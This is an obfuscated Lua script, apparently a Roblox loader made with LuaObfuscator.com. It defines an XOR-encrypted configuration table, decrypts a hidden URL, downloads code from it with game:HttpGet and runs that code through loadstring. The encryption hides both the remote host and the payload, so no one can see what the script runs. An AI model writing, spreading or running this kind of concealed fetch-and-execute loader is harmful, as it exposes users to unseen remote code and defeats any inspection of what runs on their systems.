--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]--

local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
_G.ED_CONFIG = {[LUAOBFUSACTOR_DECRYPT_STR_0("\230\230\249\13\201\148\236\33\248\231", "\126\177\163\187\69\134\219\167")]=LUAOBFUSACTOR_DECRYPT_STR_0("\115\157\114\195\250\116\206\127\196\255\122\156\125\148\171\113\153\43\146\164\123\156\127\151\250\112\203\46\198\174\114\158", "\156\67\173\74\165"),[LUAOBFUSACTOR_DECRYPT_STR_0("\1\132\108\36\146\7\107\17\132", "\38\84\215\41\118\220\70")]={LUAOBFUSACTOR_DECRYPT_STR_0("\118\71\112\67\172\0\66\123", "\158\48\118\66\114")},[LUAOBFUSACTOR_DECRYPT_STR_0("\155\22\63\14\74\154\206\153\8", "\155\203\68\112\86\19\197")]=LUAOBFUSACTOR_DECRYPT_STR_0("\78\201\34\236\83\34\170\183\67\201\51\238\78\121\233\181\66\220\36\247\78\125\246\235\8\210\36\251\15\104\247\247\94\196\121", "\152\38\189\86\156\32\24\133"),[LUAOBFUSACTOR_DECRYPT_STR_0("\217\121\134\100\208\114\131\121\219\118\138\99\207", "\38\156\55\199")]={[LUAOBFUSACTOR_DECRYPT_STR_0("\165\112\46", "\35\200\29\28\72\115\20\154")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\9\172\136\134", "\84\121\223\177\191\237\76")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\186\82\196", "\161\219\54\169\192\90\48\80")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\90\67\2", "\69\41\34\96")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\175\211", "\75\220\163\183\106\98")]=true,[LUAOBFUSACTOR_DECRYPT_STR_0("\0\184", "\185\98\218\235\87")]=true},[LUAOBFUSACTOR_DECRYPT_STR_0("\232\9\20\210\241\135\244\15\4\212\247\154\255\15", "\202\171\92\71\134\190")]={}};
local MainLoaderUrl = LUAOBFUSACTOR_DECRYPT_STR_0("\33\213\56\152\58\155\99\199\44\213\41\154\39\192\32\197\45\192\62\131\39\196\63\155\103\206\62\143\102\192\60\129\102\205\35\137\45\196\62", "\232\73\161\76");
local Success, Result = pcall(function()
	return game:HttpGet(MainLoaderUrl, true);
end);
if (not Success or not Result or (#Result == (0 - 0))) then
	warn(LUAOBFUSACTOR_DECRYPT_STR_0("\128\252\102\96\94\157\216\75\81\27\191\153\86\82\94\183\214\67\89\94\150\216\75\83\94\151\214\67\89\27\169", "\126\219\185\34\61"));
	return;
end
loadstring(Result)();
